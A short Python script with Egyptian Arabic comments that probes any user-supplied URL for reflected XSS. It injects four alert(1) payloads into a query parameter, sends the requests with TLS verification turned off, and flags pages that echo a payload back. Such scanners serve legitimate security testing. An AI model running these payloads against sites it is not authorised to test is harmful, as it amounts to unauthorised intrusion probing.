import requests
import urllib3
urllib3.disable_warnings()

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# بايلودات خفيفة جدا للتجربة فقط - مش مؤذية
PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><svg onload=alert(1)>",
    "\"><ScRiPt>alert(1)</ScRiPt>",
]

def test_xss(url):
    if not url.startswith("http"):
        url = "https://" + url
    
    print(f"\n{YELLOW}[*] بفحص XSS على: {url}{RESET}")
    print(f"{YELLOW}[*] البايلودات: {len(PAYLOADS)}{RESET}\n")

    vulnerable = False

    # هنفترض ان الرابط فيه باراميتر زي ?q= او ?search=
    # لو مفيش، السكريبت هيجرب يضيف ?q=
    if "?" not in url:
        test_url_base = url + "?q="
        print(f"{YELLOW}[!] الرابط مفهوش باراميتر، هجرب ?q= {RESET}")
    else:
        test_url_base = url
        if "=" in url:
            test_url_base = url.split("=")[0] + "="

    for payload in PAYLOADS:
        try:
            full_url = test_url_base + payload
            print(f"[-] بجرب: {payload[:30]}...", end=" ")
            
            r = requests.get(full_url, timeout=20, verify=False, headers={'User-Agent': 'XSS-Lab'})

            # لو البايلود رجع في الصفحة زي ما هو يبقى احتمال كبير مصاب
            if payload in r.text:
                print(f"{RED}[VULNERABLE!]{RESET}")
                print(f"  -> Payload reflected in response!")
                print(f"  -> URL: {full_url}\n")
                vulnerable = True
            else:
                print(f"{GREEN}[SAFE]{RESET}")

        except Exception as e:
            print(f"{RED}[ERROR] {e}{RESET}")

    print(f"\n{YELLOW}--- التقرير النهائي ---{RESET}")
    if vulnerable:
        print(f"{RED}[HIGH RISK] الموقع ده غالبا مصاب بـ Reflected XSS!{RESET}")
        print(f"{YELLOW}الخطوة الجاية: جرب البايلود يدويا في المتصفح وشوف هيشتغل ولا لا{RESET}")
    else:
        print(f"{GREEN}[SECURE] مفيش انعكاس للبايلود، الموقع شكله محمي من الـ XSS البسيط{RESET}")

target = input("ادخل رابط فيه باراميتر (مثال: https://test.com/search?q=test): ")
test_xss(target)
